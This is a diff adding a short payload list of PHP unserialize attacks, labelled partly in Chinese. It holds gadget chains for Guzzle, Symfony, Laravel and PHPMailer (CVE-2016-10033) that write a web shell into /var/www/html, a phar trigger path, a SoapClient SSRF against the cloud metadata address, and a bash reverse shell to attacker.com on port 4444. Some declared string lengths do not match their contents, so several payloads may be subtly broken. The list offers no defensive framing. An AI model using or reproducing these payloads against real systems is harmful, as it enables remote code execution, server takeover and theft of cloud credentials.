@@ -1,0 +1,12 @@
+# PHP - unserialize RCE (Guzzle)
+O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:36:"\0GuzzleHttp\Cookie\CookieJar\0cookies";a:0:{}s:39:"\0GuzzleHttp\Cookie\FileCookieJar\0filename";s:25:"/var/www/html/shell.php";s:41:"\0GuzzleHttp\Cookie\FileCookieJar\0storeSessionCookies";b:1;s:7:"\0\0\0data";s:26:"<?php system($_GET[1]); ?>";}
+# PHP - phar 反序列化 RCE (Monolog)
+phar://uploads/shell.jpg.phar
+# PHP - SoapClient SSRF + CRLF (通过反序列化)
+O:10:"SoapClient":3:{s:3:"uri";s:28:"http://169.254.169.254/latest/";s:8:"location";s:39:"http://169.254.169.254/latest/meta-data/";s:13:"_soap_version";i:1;}
+# PHP - Symfony Process RCE
+O:29:"Symfony\Component\Process\Process":7:{s:11:"commandline";s:41:"bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'";s:7:"cwd"     ;N;s:3:"env";N;s:5:"input";N;s:8:"timeout";N;s:7:"options";a:1:{s:8:"callback";N;}s:7:"process";N;}
+# PHP - PHPGGC Laravel RCE
+O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"\0*\0events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:"\0*\0queueResolver";a:2:{i:0;O:25:"Mockery\Loader\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"\0*\0event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";s:1:"x";}}
+# PHP - WordPress phpmailer RCE (CVE-2016-10033)
+O:9:"PHPMailer":1:{s:6:"Sender";s:52:"attacker -oQ/tmp/ -X/var/www/html/shell.php root";}
